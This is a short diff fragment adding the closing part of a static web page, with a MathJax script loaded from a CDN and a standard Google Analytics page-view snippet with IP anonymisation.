+  <script async src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"  integrity="sha256-nvJJv9wWKEm88qvoQl9ekL2J+k/RWIsaSScxxlsrv8k=" crossorigin="anonymous"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-153178075-1', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
